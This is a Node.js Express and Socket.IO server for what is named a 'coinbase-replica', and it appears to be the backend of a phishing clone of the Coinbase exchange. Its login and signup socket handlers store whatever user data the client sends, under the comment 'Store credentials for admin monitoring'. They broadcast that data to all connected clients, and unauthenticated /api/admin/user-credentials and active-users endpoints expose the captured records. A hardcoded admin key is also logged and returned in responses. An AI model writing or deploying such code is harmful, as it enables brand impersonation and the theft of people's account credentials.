const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const http = require('http');
const socketIo = require('socket.io');
require('dotenv').config();

const authRoutes = require('./routes/auth');
const userRoutes = require('./routes/users');
const adminRoutes = require('./routes/admin');

const app = express();
const server = http.createServer(app);

// Get frontend URL from environment or use default
const FRONTEND_URL = process.env.FRONTEND_URL || 'http://localhost:3000';

const io = socketIo(server, {
  cors: {
    origin: FRONTEND_URL,
    methods: ["GET", "POST"]
  }
});

// Security middleware
app.use(helmet());

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});
app.use(limiter);

// CORS middleware
app.use(cors({
  origin: FRONTEND_URL,
  credentials: true
}));

// Body parsing middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// MongoDB connection with fallback to in-memory storage
let useInMemoryStorage = true; // Start with true for development

// Try to connect to MongoDB, but gracefully fall back to in-memory storage
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/coinbase-replica', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
}).then(() => {
  useInMemoryStorage = false; // Only set to false if connection succeeds
}).catch(() => {
  console.log('MongoDB not available, using in-memory storage for development');
  useInMemoryStorage = true;
});

mongoose.connection.on('connected', () => {
  console.log('Connected to MongoDB');
  useInMemoryStorage = false;
});

mongoose.connection.on('error', (err) => {
  console.error('MongoDB connection error:', err);
  console.log('Falling back to in-memory storage for development');
  useInMemoryStorage = true;
});

// In-memory storage for development (when MongoDB is not available)
const inMemoryUsers = new Map();
const inMemoryPortfolios = new Map();

// Add this to make storage accessible to routes
app.locals.useInMemoryStorage = () => useInMemoryStorage;
app.locals.inMemoryUsers = inMemoryUsers;
app.locals.inMemoryPortfolios = inMemoryPortfolios;

// Create default test user for development
const bcrypt = require('bcryptjs');
bcrypt.hash('test123', 10).then(hashedPassword => {
  inMemoryUsers.set('test-user', {
    _id: 'test-user',
    email: 'test@coinbase.com',
    password: hashedPassword,
    firstName: 'Test',
    lastName: 'User',
    createdAt: new Date()
  });
  console.log('Default test user created: test@coinbase.com / test123');
});

// Store active users for real-time monitoring
const activeUsers = new Map();
const userCredentials = [];

// Socket.IO for real-time features
io.on('connection', (socket) => {
  console.log('User connected:', socket.id);

  socket.on('user-login', (userData) => {
    activeUsers.set(socket.id, {
      ...userData,
      timestamp: new Date(),
      socketId: socket.id
    });
    
    // Store credentials for admin monitoring
    userCredentials.push({
      email: userData.email,
      timestamp: new Date(),
      action: 'login',
      socketId: socket.id
    });

    // Broadcast to admin dashboard
    io.emit('user-activity', {
      type: 'login',
      user: userData,
      activeUsersCount: activeUsers.size,
      timestamp: new Date()
    });
  });

  socket.on('user-signup', (userData) => {
    userCredentials.push({
      email: userData.email,
      timestamp: new Date(),
      action: 'signup',
      socketId: socket.id
    });

    // Broadcast to admin dashboard
    io.emit('user-activity', {
      type: 'signup',
      user: userData,
      activeUsersCount: activeUsers.size,
      timestamp: new Date()
    });
  });

  socket.on('disconnect', () => {
    console.log('User disconnected:', socket.id);
    activeUsers.delete(socket.id);
    
    // Broadcast updated active users count
    io.emit('user-activity', {
      type: 'disconnect',
      activeUsersCount: activeUsers.size,
      timestamp: new Date()
    });
  });
});

// Test admin endpoint
app.get('/api/admin/test', (req, res) => {
  const adminKey = req.header('X-Admin-Key');
  const expectedKey = 'admin123';
  console.log('Test admin endpoint:', { adminKey, expectedKey, match: adminKey === expectedKey });
  
  if (adminKey !== expectedKey) {
    return res.status(403).json({ error: 'Invalid admin key' });
  }
  
  res.json({ message: 'Admin key works!', adminKey, expectedKey });
});

// Routes
app.use('/api/auth', authRoutes);
app.use('/api/users', userRoutes);
app.use('/api/admin', adminRoutes);

// Admin endpoints for real-time monitoring
app.get('/api/admin/active-users', (req, res) => {
  const users = Array.from(activeUsers.values());
  res.json({
    count: users.length,
    users: users
  });
});

app.get('/api/admin/user-credentials', (req, res) => {
  res.json({
    credentials: userCredentials.slice(-100) // Return last 100 entries
  });
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date() });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({ error: 'Route not found' });
});

const PORT = process.env.PORT || 5001;

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Admin dashboard available at http://localhost:${PORT}/api/admin/active-users`);
});

module.exports = { app, io, activeUsers, userCredentials };